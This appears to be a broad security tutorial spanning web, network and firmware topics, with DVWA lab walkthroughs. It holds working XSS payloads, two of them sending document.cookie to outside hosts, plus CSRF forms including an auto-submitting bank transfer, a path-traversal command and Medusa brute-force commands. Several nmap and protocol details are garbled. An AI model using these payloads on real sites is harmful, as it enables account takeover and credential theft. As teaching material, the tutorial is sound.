Many services run on a REST API, which forces a certain architecture — dropping sessions in favor of simple request-response, for instance. REST has a lot going for it: caching, customizable content, and a simple interface. And contrary to a common assumption, **REST != HTTP** — anything REST can return is considered a resource. On authorization, stick to the simple rule of **Fail-Safe Defaults**: the default access level should be denied. Never add potentially sensitive information to a URL, logins and passwords especially. With SSL enabled, personal data in `user:password` format is Base64-encoded. The server receives the login and password and, if all is well, responds with `200 OK`; if not, `401 Unauthorized`. This is the simplest form of authorization — the more complex form is token-based authorization and [JWT](https://jwt.ms/). When documenting a REST API, you need these blocks: the request line, headers, and message body.

If your service's authorization runs through Facebook, LinkedIn, or Twitter, you need to register your app and get an API key, which results in a digital signature — instead of sending your login and password to Facebook, the signature is sent.

ACLs are what manage access control within the OS. Standard practice is three distinct access types — `read`, `write`, and `execute` — and a binary yes/no on performing each. It looks like this:

```
user::rwx
group::rwx
other::rwx
```

`rwx = 111` in binary form is 7.

In Linux, access is managed with the `chmod` command. To give the owner read and write rights, for instance, `chmod 600 mytext.txt` does it (or `sudo chmod 600 mytext.txt` if that doesn't work). To break the mechanics down further: Linux permissions have exactly three levels — the User who created the file or directory, the Group of users sharing the same rights, and Others (everyone else) — and each of those levels carries three permission types: `Read [r]` — viewing a file or folder's contents, mapped to the digit 4; `Write [w]` — editing a file or folder's contents, mapped to 2; and `Execute [x]` — running programs, or `cd`-ing into a folder, mapped to 1. Knowing the digits, you can compute the access level: `Owner: rw- (4+2) = 6`, `Group: rw- (4+2) = 6`, `Others: r-- (4) = 4`, or `rwx (4+2+1) = 7`. Checking a folder's permissions is done with `ls -l`.

Linux also has the UID, the user identifier — UID 0 is root, and UIDs 1–999 are reserved for particular operational tasks (a print service, say). If you want to check whether a Linux kernel itself is carrying known vulnerabilities, the basic information-gathering commands are `uname -a` (OS and kernel info together), `lsb_release -a` (OS info), `hostnamectl | grep Kernel` (kernel info), `uname -r` (kernel info), and `cat /etc/issue` (OS info); once you have the version, checking it against [exploit-db](https://www.exploit-db.com/) tells you whether known vulnerabilities exist for that specific kernel build — a basic but useful piece of vulnerability-assessment hygiene, whether you're the defender patching a fleet or a tester documenting exposure.

In huge companies, the preferred approach is RBAC, where a person's role in the company determines their access — RBAC sticks to a role-based approach, meaning an employee can be assigned both an administrator role and an ordinary-user role at once.

## TCP

At the transport layer we use TCP, which lets two devices communicate directly through an unbroken stream of data. The transport layer is entirely about delivering a message to the user as reliably and economically as possible, and for that it leans on the network layer. The two layers are very similar, differing only in that the transport layer is about the user's device while the network layer is about work at the router. The user has no way to influence the router's operation, so network-layer problems get solved on the transport-layer side — the network drops packets? We turn on retransmission.

TCP uses a three-step handshake to establish a connection: first comes a TCP SYN message, saying "I, the user, want to open a connection"; the response should be TCP SYN ACK, and the final step is TCP ACK. The TCP header carries the sender's and receiver's port numbers (TSAP), a sequence number, ACK, and a set of flags. And yes, attackers use SYN to simulate a TCP/IP connection and carry out DoS attacks. The sequence number and ACK exchange values depending on the side. On the first handshake step, TCP sends a `client_hello` message with a set of parameters: version, random value, session ID, and the list of supported cryptographic algorithms; the server's `server_hello` response carries similar parameters. The handshake is only one of three protocols riding on top of TLS. HTTP is a simple TCP connection over port 80; HTTPS runs over port 443, with a TLS connection over TCP. HTTP handles data exchange between client and server, and runs on top of TLS. The second of the three protocols is CCS, the third is Alert.

A persistent connection isn't free, though. The question worth asking is when to close it. The connection to the server should stay open while the page loads — and then what? There's a good chance the user will click a link that requests another page from the server; if the connection stays open, the next request can be sent immediately. There's no guarantee, though, that the client will make another request to the server any time soon. In practice, clients and servers usually keep persistent connections open until they've been idle for a short time (60 seconds, say), or until there are so many open connections that some need closing. You can also maintain many TCP connections at once, and a connection can be forcibly "killed" with TCPView.

Keep in mind that protecting the confidentiality and integrity of transmitted data isn't always the goal of setting up a secure channel — sometimes only integrity protection is needed. And building a secure channel doesn't necessarily require cryptography: if a channel is protected purely at the physical layer, with no possibility of connecting to external networks, the connection is already secure.

TCP, like UDP, works on the concept of ports — a 16-bit number from 0 to 65535, with 0 to 1023 used for services. Applications "listen" on particular ports: SMTP on 25, DNS on 53, HTTPS on 443, almost all of them over TCP. Some ports are reserved; you can find the list [here](https://en.wikipedia.org/wiki/List_of_TCP_and_UDP_port_numbers). Ports 1024 to 49151 can be registered through IANA, though applications choose ports at their own discretion — BitTorrent, for instance, uses the 6881–6887 range but sometimes others too.

The TCP header is 20 bytes, leaving 65,535 − 20 − 20 = 65,495 bytes for data. At the bare minimum, every device is required to handle 536 + 20 = 556 bytes.

There's also the Heartbeat protocol, which indicates a system is operating normally and helps with synchronization. For TLS this was introduced in RFC 6250 and consists of two messages, `heartbeat_request` and `heartbeat_response`, established during the first handshake step.

**SSH.** Originally built as a cheap, secure networking solution and a proper replacement for Telnet, running over TCP as a set of three protocols. To connect to a remote host, `ssh user@192.168.125.51` is the command; you'll most likely be asked to accept a public key, and you answer `yes`. Now `ls -la` checks the contents of the home directory, where you'll find a `.ssh` directory holding a `known_hosts` file, whose contents mean you won't be asked anything on a repeat connection to `192.168.125.51`.

![SSH connection](https://your-scorpion.ru/wp-content/uploads/2023/02/Frame-428.png)

To generate a new host key, the commands are:

```
sudo rm /etc/ssh/ssh_host_*
sudo dpkg-reconfigure openssh-server
sudo systemctl restart ssh
```

If you now type `exit` and try reconnecting to `192.168.125.51`, this time there'll be a mismatch between the expected and the actual public key.

SSH can forward ports — effectively turning TCP into SSH. There are two types of forwarding: local and remote. Local takes some TCP traffic and redirects it into SSH; remote SSH has the client start behaving like a server.

## XSS

An XSS attack is fairly simple: JS code gets inserted into an HTML document. There are variants — Reflected XSS, for instance. An example of such an attack, `https://www.site.ru/search/?text=%3Cscript%3Ewindow.open(%27https://your-scorpion.ru/?cookie=%27%20+%20document.cookie);%3C/script%3E`, would of course be blocked by the site, preventing the JS code from executing. But potentially, the browser could open a new window and send the cookies to the attacker's side — hence the name "Reflected."

Another type of XSS attack is Stored, where the malicious script always lives on the server side.

The idea is clear enough: we add some code, and it becomes part of the web page. Countering this attack means validating whatever's entered into any text field — and the check has to happen not just on the front end but on the back end too; typing `document.forms` into the console, for instance, lets you use the retrieved form to send spam.

Validation also has to account for the different computer representations of identical data. One example is a technique called escaping, which converts alphabetic characters into a more computer-native form: `<script>` becomes `&lt;script&gt;`. This is solved with sanitization, where everything except a plain string is stripped away. And for preventing XSS, a CSP as simple as `default-src 'self'; script-src 'self'; object-src 'none'; frame-src 'none'; base-uri 'none';` is enough.

It's important to convert HTML and JS characters like this:

```
< converts to: &lt;
> converts to: &gt;

< converts to: \u003c
> converts to: \u003e
```

I'll say right away that this kind of basic sanitization isn't enough for real projects — server-side HTML sanitization doesn't guarantee safety on its own. A chain of parse > serialize > parse runs straight into the particulars of parsing itself. Lower-level character conversion is possible too — the number 45, for instance, is `101101`, since 45 = 1×32 + 0×16 + 1×8 + 1×4 + 0×2 + 1×1.

Even a slash `/` can be rendered differently, and that's the path to a folder: `../../../../../etc/passwd/`. To write a slash in 1 byte you write `0xxx xxxx`; in 2 bytes, `110x xxxx 10xx xxxx`; in 3 bytes, `1110 xxxx 10xx xxxx 10xx xxxx`. This is possible because the UTF-8 encoding for Unicode characters (RFC 2279) was defined for using Unicode within ASCII systems: ASCII characters (U0000–U007F) are represented as bytes 0x00–0x7F, while other characters occupy the 0x80–0xF7 range. In other words, a name can be written for a computer to read in different ways — the same IP address might be written without dots, or a filename might be written in uppercase. An example Windows terminal command that uses `ping` to launch the calculator as a harmless proof of the underlying path-traversal issue:

```
cmd.exe /c "ping 8.8.8.8/../../../../../../../../../../../../../windows/system32/calc.exe"
```

Let's carry out an attack ourselves — in a test environment, naturally. The first step in finding web-application vulnerabilities is understanding the app's basic functionality: finding the points where the user enters data, and understanding how the application processes that input. We'll use the DVWA web app from Kali: launch Kali, log into the app through the login page, `http://192.168.125.150/login.php`, and set DVWA's difficulty level to Low.

![DVWA login at Low difficulty](https://your-scorpion.ru/wp-content/uploads/2023/02/kali_low.png)

Then go to the XSS (Reflected) page. The page has a text field — try entering any text and see how the system greets you.

![DVWA reflected XSS text field](https://your-scorpion.ru/wp-content/uploads/2023/02/Frame-15.png)

Next we should check how the app processes user input and how we can put that to non-benign use.

![Reviewing the app's source](https://your-scorpion.ru/wp-content/uploads/2023/02/Снимок-экрана-2022-06-22-в-21.48.36.png)

The app lets us look at its code. Notice lines 6–8, where the app checks whether the user entered data; if so, it sends the Hello message back with the user's data, exactly as it was entered. What if we enter `<h2>Hi</h2>`? It works — our text takes on the visual properties of an H2 heading, easily confirmed in the browser's inspector.

![H2 heading rendered from input](https://your-scorpion.ru/wp-content/uploads/2023/02/Group-33092.png)

Let's go further and try running JS code. The commands `<script>alert("XSS")</script>` and `<script>alert(document.cookie);</script>` both work, unsurprisingly:

![XSS alert firing](https://your-scorpion.ru/wp-content/uploads/2023/02/Group-3.png)

Cleverer methods for bypassing basic validation involve playing with the characters, like `<scr<script>ipt>alert("XSS")</script>` or `<Script>alert("XSS")</script>`. Or you can go further and hook into event handlers such as `onload`, `onclick`, `onerror`, and so on. We could add an `onclick` handler to a button so it runs when clicked; here we'll use an `onerror` handler on an image, set up so that if the image fails to load, the JavaScript in the `onerror` handler runs. A finished script might look like this:

```
<img src=randomStuff onerror='alert("XSS")'>
```

You can't always steal the victim's cookies. If `httpOnly` is set on the victim's cookies, you can't reach them with JavaScript — `httpOnly` makes the cookie invisible to JS. `httpOnly` is an extra flag included in the HTTP `Set-Cookie` response header, and using it when generating a cookie helps reduce the risk of client-side scripts reaching a protected cookie. That doesn't mean other actions can't be carried out on the victim's behalf, though. Using XSS, it's possible to steal sensitive information — banking transactions, email, medical records — using the victim's account. You don't need to access the victim's account directly; you can simply build a payload that grabs the information and sends it to your server. This is exactly why disabling `HTTP TRACE` matters.

Cookies travel in a header, looking like `Set-Cookie: id=2bf353246gf3; Secure; HttpOnly`. A cookie marked `Secure` is only sent over HTTPS, which ensures confidentiality and protection from MiTM, but doesn't guarantee integrity. The `HttpOnly` attribute discussed above only ensures confidentiality. A third attribute, `Path`, sets the path. And don't forget two useful tools for XSS prevention: XSS Hunter for testing blind XSS, and XSStrike for finding XSS vulnerabilities.

To sum up: during a normal user session, the server sends the client a cookie with a session ID, and the client sends the session ID back to the server. So to impersonate a user, an attacker needs that cookie — either by intercepting it during the server-client exchange (which HTTPS successfully defends against), or via JS.

In DevTools, the Application tab has a Cookies section. When you select a cookie from the list, watch for two flags: if `secure` isn't checked, the cookie can travel over plain HTTP; if `httponly` isn't checked, the cookie is reachable through JS. You can type `document.cookie` into the console and access the cookie — that isn't session theft, just confirmation that an XSS attack is possible on that page. But if an attacker manages to inject code like this into a page's form:

```
<script>new Image().src = 'http://another.site/' + encodeURIComponent(document.cookie)</script>
```

then when the user submits the form, the attacker's server logs get a valid session ID, and all the attacker needs to do is swap the value in their own cookie for the fresh one from the logs. So make sure every security parameter on your cookies is set correctly.

![Cookie theft via injected script](https://your-scorpion.ru/wp-content/uploads/2023/05/sjl.gif)

**DOM-based XSS.** Back to our favorite DVWA, selecting the relevant menu item at Low difficulty. The chosen page should have a dropdown letting users pick the web app's language — English, French, Spanish, German. When you pick a language and click submit, the choice appears in the browser's URL as a default input parameter.

![Language dropdown appearing in URL](https://your-scorpion.ru/wp-content/uploads/2023/02/Frame-172.png)

As usual, we insert `<script>alert(document.cookie)</script>` and check the result.

![Alert firing via URL parameter](https://your-scorpion.ru/wp-content/uploads/2023/02/Group-33139-1.png)

But that was too easy. Let's switch to `medium` difficulty, which involves the backend — our simple attack using the `<script>` tag no longer works. Since we can't use the script tag, we can use event handlers instead. The `onerror` event can run JavaScript if an image fails to load, so we just need to point an HTML `img` tag at a nonexistent image, achieved by giving the `src` attribute a nonexistent destination:

```
</option></select><img src=x onerror=alert("xss")>
</option></select><img src=x onerror="alert(document.cookie)">
```

And let's work through **High** difficulty, which has its own quirk: parts of the request are evaluated by the server, but whatever sits after the `#` symbol never gets sent to the server at all.

`http://192.168.125.150/vulnerabilities/xss_d/#default=<script>alert(document.cookie)</script>`

![High-difficulty DOM XSS via URL fragment](https://your-scorpion.ru/wp-content/uploads/2023/02/Details.png)

Code analyzers help minimize problems like these, and come in two kinds. Static analysis examines code, or any other artifact, for vulnerabilities. Dynamic analysis examines the program's actual operation — the process of launching it and running its functions. Neither is inherently better; they simply serve different purposes. Static code analysis is good for finding unsafe functions (`gets()`, for instance), dead code (code that never actually executes but still takes up space and can therefore be attacked), memory safety, and type checking (verifying, depending on the language, that types behave as they should), but it can't check input validation or every type of function argument.

Dynamic analysis can, to some extent, look for input validation and check function arguments, at the cost of reduced runtime performance — it's usually used while testing software still in development, rather than in production.

## CSRF

Unlike XSS, which exploits a user's trust in a particular site, CSRF exploits a site's trust in the user's browser. Say a user clicks a malicious link and opens a page carrying malicious code while logged into their online banking. Earlier, they visited their bank's site, and the bank left a cookie in their browser; now they visit an attacker's site, or even fill out a form via an ad banner that sends a request to the bank through a feedback form, using the stored cookie. Or an attacker could swap in their own authorization data, making any user action visible to them. Modern browsers use **SameSite cookies**, which neutralize this attack — cookies set with the `SameSite` attribute are indistinguishable in HTTP requests from cookies without it (i.e., the `SameSite` attribute itself isn't specified in the HTTP request).

Carrying out a CSRF attack requires three conditions: an action inside the app that's backed purely by browser-cookie-based identification, with no unpredictable parameters in the request.

Classically, we go to `http://192.168.125.150/login.php`, set difficulty to Low, and open the CSRF page. Trying to change the password, we see it's sent directly in the browser's address bar:

![Password change request in the URL bar](https://your-scorpion.ru/wp-content/uploads/2023/02/Catalogue.png)

Here the app relies purely on the session cookie to track the session. We'll need to build an empty HTML page living on our own server; luring the user to that page is a matter of social engineering. In the most primitive case, the app uses HTTP GET to change the password, which can be automated — an attacker can exploit this by sending the victim a URL: `http://192.168.125.150/vulnerabilities/csrf/?password_new=attackerPassword&password_conf=attackerPassword&Change=Change`, which changes the password automatically. But that would be far too obvious, so it's better to have the victim change the password themselves — sending the URL above directly could raise suspicion. Much better to host the malicious HTML document on an external site. Here's the code for that page:

```html
<form action="http://192.168.125.150/vulnerabilities/csrf/?" method="GET">
    <h1>CSRF attack</h1>
    <input type="hidden" AUTOCOMPLETE="off" name="password_new" value="pentester77">
    <input type="hidden" AUTOCOMPLETE="off" name="password_conf" value="pentester77">
    <input type="submit" value="click me" name="Change">
</form>
```

Log in as the victim, visit the page we created, follow the link, and you'll see the password has changed.

![Password changed via CSRF form](https://your-scorpion.ru/wp-content/uploads/2023/02/Group-3-2.png)

At a more advanced level, the CSRF attack is carried out with Burp Suite's involvement.

![CSRF attack via Burp Suite](https://your-scorpion.ru/wp-content/uploads/2023/02/aadadadfsfaadadadadadada.png)

XS-Leaks exploit browser quirks to reveal some piece of information about the visitor — whether the user has ever visited Facebook, say, with a binary yes-or-no answer. It works on this principle: after a first visit to Facebook, certain files were cached to speed up loading; if a request completes in 500ms, the resource wasn't pulled from cache, meaning the user never visited Facebook. This is useful for enriching a fingerprint. [Examples here](https://xsleaks.dev/).

Once again: CSRF forces a user to carry out an action they didn't intend. The attack also goes by One-Click Attack, XSRF, Sea Surf, Session Riding, Cross-Site Reference Forgery, or Hostile Linking. The concept is simple — you want to transfer money to a colleague, and an attacker wants to receive that money instead. To do this, they craft a malicious URL and trick you into clicking it. Say the correct URL would be `GET http://bank.com/transfer.do?acct=VIKTOR&amount=500 HTTP/1.1`, and the attacker writes the address `http://bank.com/transfer.do?acct=ATTACKER&amount=10000`. The attacker sends you this link by mail, or embeds the link on a page you visit often — a torrent-download link, for instance, or an anchor tag reading something like "send with no fee."

For a POST request, a form is needed:

```html
<form action="http://bank.com/transfer.do" method="POST">
<input type="hidden" name="acct" value="VIKTOR"/>
<input type="hidden" name="amount" value="50600"/>
<input type="submit" value="Check balance"/>
</form>
```

And automatic submission using JS: `<body onload="document.forms[0].submit()">`.

For your own web app, there's a useful, purely manual way to test for both of these classes of attack without any specialized tooling. XSS attacks use HTML/JS, meaning the attack happens without server involvement, in the browser — in the most primitive form, you insert the string `"><script>alert('wow')</script>` into any input. A slightly more advanced version adds a DOM image element and reaches cookies through it: `"><img src="http://testsite/" + document.cookie;`. Another example of this class of attack is when the backend blindly trusts everything sent as URL parameters; an attacker can append additional code, like `('XSS%20Testing')`, as a parameter at the end of the URL. A site should defend against this — thankfully, these attacks are extremely primitive, and the fix is simple: configure a CSP, disallow inline scripts, and JS embedded in HTML won't run.

To summarize, XSS attacks split into three buckets: Reflected — the script rides in the HTTP request, and it fires the moment the user clicks a link. Persistent — the script is stored on the server and gets sent to the user along with legitimate content; an attacker manages to submit a request that plants malicious code into the database, and something like `fetch('/malicious-code')` ends up inserted into a request form. And DOM-based — a vulnerability in the front-end code itself. XSS lets an attacker steal cookies and gain account access; defending against it means input validation plus output encoding — the first validates that no scripts get through, the second ensures any data pulled from the server can't be recognized by the browser as executable code.

Reading data across domains, meanwhile, is what CSRF is about — a simple iframe can do it. These vulnerabilities aren't tied to any particular programming language, unlike vulnerabilities that are language-dependent and need separate testing (RCE, deserialization, SSRF). All the same, these are fairly simple attacks, more mischief than menace unless you're looking at a chain like XSS -> CSRF -> RCE. What genuinely deserves fear is RCE, SQL injection (Python especially), SSTI, arbitrary file upload/read, XXE, and SSRF. CSRF performs actions on the user's behalf — a user logs into their bank profile, and a transfer request fires automatically. A GET request can be triggered by something as simple as loading an image, and such a request can change the user's saved data; a POST request is harder to exploit but still possible. The countermeasures: anti-CSRF tokens, unique per user session; `SameSite=Strict` or `SameSite=Lax`, which stops the browser from sending cookies along; and, as a baseline, storing sessions in cookies with the `secure`, `HttpOnly`, and `SameSite` flags set, plus the headers `X-Content-Type-Options`, `Strict-Transport-Security`, `X-XSS-Protection`, `X-Frame-Options`, `Referrer-Policy`, `Content-Security-Policy`, `Expect-CT`, `Feature-Policy`, and `Cache-Control`. And third, CSP as a browser feature lets you whitelist a specific set of resources; for isolation, browsers came up with the iframe — stick to it, and set the right CSP policy. Most web frameworks handle this out of the box.

## BIOS/UEFI

BIOS and UEFI are two different approaches to a device's initial firmware. BIOS is older than UEFI, which makes UEFI more flexible — BIOS, for instance, can't boot from media larger than 2.1 TB, against 9.4 zettabytes for UEFI. The firmware sits on erasable read-only EEPROM memory and runs in 32-bit or 64-bit protected mode on the CPU.

UEFI's capabilities are quite impressive given how primitive this kind of software otherwise is — remote power-on is possible, for instance. One use is automatically powering the computer on when power is restored after an outage; for attackers, the same mechanism could power the computer on by timer, early in the morning before the workday starts. Option names in UEFI/BIOS differ between manufacturers, so I won't give specific examples. Another useful feature: if you want to add a fingerprint sensor to an existing device, that's possible, but it requires working directly with the BIOS/EFI/UEFI layer — otherwise the access can simply be bypassed by booting a different OS without your lock program in place.

If UEFI itself was infected, the stealth and difficulty of detecting such viruses, along with their persistence (staying active even after the system is reformatted), make this class of malware very powerful. Any malicious program running at a lower level/ring than the protection mechanism is far harder to detect — which is why a detection tool should run at least at the same level/ring as the malware it's targeting, and ideally lower.

Firmware (BIOS/UEFI) and operational modes (SMM — system management mode) handle the boot sequence, power management, and chip-level error handling, among many other tasks; this class of firmware and operational mode can effectively run without the OS or hypervisor's knowledge. BIOS/UEFI and SMM operate below the OS level, and when the OS starts, BIOS/UEFI is the first to check the amount of memory and the connected devices. Digital signatures and secure boot are used to verify the BIOS. SMM rootkits often work by overwriting System Management RAM, the part of system memory used to store the code SMM relies on. SMM handles system events like memory or chipset errors, manages deeper power states during sleep mode, and emulates a PS/2 mouse and keyboard — but it doesn't prevent malicious code from running.

Having different BIOS implementations on the market is actually a good defense. Fragmentation causes duplicated effort, but it also diversifies the attack surface — meaning it's harder for an attacker to succeed, since a targeted attack requires extra reconnaissance and weaponization to work out exactly which BIOS to break, and then carry out the attack against it specifically. That said, far more people will be scrutinizing a standard than any single BIOS implementation. Still, most (if not nearly all) manufacturers now use UEFI, which is more standardized.

And generally, it's very useful to check employees' systems with the command `(Get-PSReadLineOption).HistorySavePath`, followed by `cat` plus the path from that command — it can protect you even against malicious insiders.

## Network mapping

Network mapping (inventorying) solves the problem of finding every active device on a network. DNS or reverse DNS can help here, or the ICMP protocol acting as an echo over a broadcast or a narrow range. Broadcasting, multicasting, and anycasting: broadcasting means an IP packet is sent to every recipient; multicasting means sending a packet to a specific group of recipients; anycast packets are sent only to destinations the router decides are the nearest on the network. The nmap command for this is `sudo nmap -PE 192.168.125.1/24`. Now let's get into the details:

ICMP is a protocol used for network debugging or error-finding. It can be used to "ping" or discover hosts on a network, because ICMP adds status information to IP datagrams, and RFC 791 states that the standard response to receiving an ICMP echo request is sending an ICMP echo reply — confirming the node is operational. If you send requests manually, a firewall will get in the way of inventorying devices, and that's the point where you switch to nmap.

By default, nmap sends an ICMP echo, an ICMP timestamp request, a TCP SYN on port 443, and a TCP ACK on port 80. The command `sudo nmap –sT 192.168.0.1` performs a full handshake and establishes a TCP connection; `sudo nmap -sU 192.168.0.1` checks whether ports are open or closed — no response means the port is closed. Without timeouts, naturally, you'd be running a SYN flood attack yourself, and conversely, if you send failure messages to millions of spoofed connections, you can end up on the receiving end of a DoS attack; Linux limits this at the kernel level for ICMP. nmap plus TCP is also a good way to understand what rules are configured on a firewall. Another useful command, `nmap -os -db`, lets you guess the OS's characteristics. `nmap -sn 192.168.125.1/24` performs a ping scan across the entire subnet and displays the list of active hosts.

![nmap subnet scan results](https://your-scorpion.ru/wp-content/uploads/2023/03/Group-3-1.png)

To exclude an address from the scanned range: `nmap -sn 192.168.125.1/24 --exclude 192.168.125.1`. To scan a target address range: `nmap -sn 192.168.125.80 192.168.125.112`. But faster and more fun is `nmap -PS 192.168.125.1/24`, a full TCP SYN ping.

The command `nmap -sV` tries to identify the services on a port; `-sC` runs a script against discovered services; `-o` works out the OS; `-oA` outputs results across file types. All told, a command might look like `sudo nmap -sV -sC -O -oA nmap -www-sitetest-com www.sitetest.com`, giving you data for analyzing the backend technologies in use.

Much of what's described above amounts to a Smurf attack in miniature — sending a huge number of ICMP messages. A Smurf attack is a distributed denial-of-service attack where a large number of ICMP packets are sent to a broadcast IP destination address, with the source IP address set to the intended victim's. Devices receiving these broadcast packets send a response to the source IP, and if enough machines receive and respond this way, the victim's computer gets flooded with traffic. Since ping is an ICMP packet, some admins block it on their devices using a firewall — any NGFW will recognize this kind of attack.

To block ICMP: `iptables -A INPUT -p icmp --icmp-type echo-request -j DROP`, which creates trouble for both attackers and yourself in equal measure. In any case, ICMP isn't a reliable diagnostic tool — it's easily dropped under channel congestion, and ICMP rate limiting is widely applied as a DDoS defense. And, more in the spirit of a mischievous tip than solid advice, `ping` itself can be disabled with `echo "1" > /proc/sys/net/ipv4/icmp_echo_ignore_all`, which can hide a VPN server from bots.

If everything's gone well, you can put together a rule table like this:

| Rule | Action | Source Address | Destination Address | Protocol | Source Port | Destination Port |
| --- | --- | --- | --- | --- | --- | --- |
| 1 | Allow | Any | 192.168.1/24 | TCP | >1023 | Any |
| 2 | Deny | 192.168.1.1 | Any | Any | Any | Any |
| 3 | Deny | Any | 192.168.1.1 | Any | Any | Any |
| 4 | Allow | 192.168.1/24 | Any | Any | Any | Any |
| 5 | Allow | Any | 192.168.1.2 | TCP | Any | SMTP |
| 6 | Allow | Any | 192.168.1.3 | TCP | >1023 | HTTP |
| 7 | Deny | Any | Any | Any | Any | Any |

The table shows just the internal part of the network — a router with a firewall, and an internal DMZ with a set of hosts. When you want to run a web server with a public IP that needs full internet access, while keeping your network protected from external traffic, that's what a DMZ is for. The last rule is simply "deny everything," and it only fires if none of the rules above it match. The first rule allows anything from any source to the destination on the internal network, provided the protocol is TCP and the port is above 1023 — ports 0–1023 are generally treated as privileged. The second rule denies any connection to our router at 192.168.1.1, meaning we block anything our firewall itself flagged. The third rule is similar, but forbids sending anything to the router; the router should be isolated from the network, though Drop is better applied at the firewall itself. The fourth rule says that from the internal network, we allow access out to the internet. The sixth rule lets packets fly from any source to 192.168.1.3, but only over HTTP.

This is on top of the standard Windows defenses: using Credential Guard, restricting logins to workstations with elevated privileges, forbidding credential delegation and remote access in AD, administrators not having mailboxes, and Lanman removed with the password changed via a cold reboot.

If you need to build a documented campus-network architecture from nothing, discovering devices on the network with CDP (L2) and LLDP (L2) helps find neighboring devices. CDP is a proprietary link-layer protocol that returns the hostname, remote port ID, system platform, system version, and management addresses. It has to be enabled globally first, then on the interface — and protocols like this should be disabled at network borders and on end-user machines.

```
SW1(config)#cdp run
SW1(config-if)#cdp enable
SW1#show cdp neighbors GigabitEthernet 0/1 detail
```

Alongside the nmap described above, there's the faster Zenmap for network scanning:

```
root@ubuntu:/#apt install nmap
root@ubuntu:/# nmap -sn 192.168.230.0/24
```

`nmap -f 10.x.x.x` runs a quick scan; `nmap --script=firewalk 10.x.x.x` probes firewall rules; `nmap -sV --script=banner 10.x.x.x` shows service versions.

ARP and MAC-table data are useful too: the number of MAC addresses behind a switch port tells you whether an end device or a network device sits there, and the OUI tells you the manufacturer. ARP will tell you how many active devices are on the network. And don't forget the data from routing tables and hardware configuration files.

Along similar lines — testing credentials rather than mapping the network itself — during an authorized pentest, checking passwords on remote machines is often done with a tool like [Medusa](http://foofus.net/?page_id=51), which supports more than 20 protocols. Once you've identified your target's IP, the command `medusa -h 192.168.125.170 -u ubuntu -P wordlist.txt -M ftp` can surface valid FTP credentials from a wordlist; from there, `ftp 192.168.125.170` with the recovered login lets you connect, `cd Desktop` and `ls` to see what's there, and `get filename.txt` to pull a file back to your own machine. The same approach carries over to other protocols — `medusa -h 192.168.125.170 -u lorin -P wordlist.txt -M ssh -O cracked.txt` followed by `ssh lorin@192.168.125.170`, or `medusa -h 192.168.125.170 -u gold -P wordlist.txt -M pop3 -b -v 7` for POP3.

## Firewalls

There are two kinds — network and host. Network firewalls establish protection between two networks; host firewalls live between the network and the end device. A network-based firewall acts as a gateway between two or more networks, while a host-based firewall is deployed on the specific endpoint it's meant to protect. Both types work by filtering network traffic. A firewall can also be stateless, where the rules simply block or allow specific traffic, or stateful, which ties itself to a session and makes decisions based on the situation, using statistics and more — analyzing network traffic for suspicious signs and behavior, and preventing them from entering the network.

A firewall looks at a network packet's contents, especially the source and destination IP address, and blocks traffic if a matching IP is on a blacklist — though an IP address can be spoofed. For the most part, firewalls are used to block specific resources by IP, cut off some spam at the SMTP level, block access based on IPSec authentication credentials, and grant internet access only during working hours.

A packet filter on a firewall operates at layers 3 and 4 of the OSI model, usually covering the source and destination IP addresses and TCP/UDP port numbers — you might allow all traffic except Telnet and SNMP, or the reverse, blocking everything except HTTPS, POP3, SMTP, and SSH. But obviously, if traffic to email is allowed, a virus can arrive through that channel, bypassing the firewall entirely — and port 80 is very likely to be left open too, letting a huge number of protocols tunnel through HTTP.

That's exactly the problem an IDS helps with — it has sensors for analyzing anomalies and misuse, which can be syslogs, firewalls, or Wireshark. Anomalies are usually understood as atypical behavior from the standpoint of ML, statistics, and a knowledge base, drawing on Bayesian networks, Markov models, neural networks, genetic algorithms, clustering, and outlier detection. It surfaces three key things for follow-up: the location of the detection, a description of the detection, and, where possible, a button for reacting to it. The detection works like this: the ML model knows what "normal" looks like, and anything that isn't normal gets flagged as a danger — if an API has never in its history been reached from Paris at 3 a.m., and suddenly it is, that's an anomaly. If the IDS can also prevent intrusions, that's an IPS, which will most likely simply block the sender or drop the packets. An IDS works passively, meaning its job is purely monitoring — once malicious activity is detected, it's up to the administrator to act in time and prevent the fallout. Active defense also responds to detected intrusions. It's better to look toward a SIEM — Splunk or Chronicle, say.

And keep automation via ML, DL, and LLMs in mind too:

- **ML** works on numbers, needed for analyzing structured data at high speed — we give the computer examples of something, and it finds recurring patterns. This is how ML helps find network anomalies and do malware classification, and does it very quickly. Algorithms commonly used in security include K-means, random forest, and SVM, plus isolation forest for finding outliers.
- **DL** is neural networks for working with raw data, images, audio, and video included — it needs more resources, and is something of a black box.
- **LLMs** can understand social engineering but hallucinate; they're a good fit for working with real text.
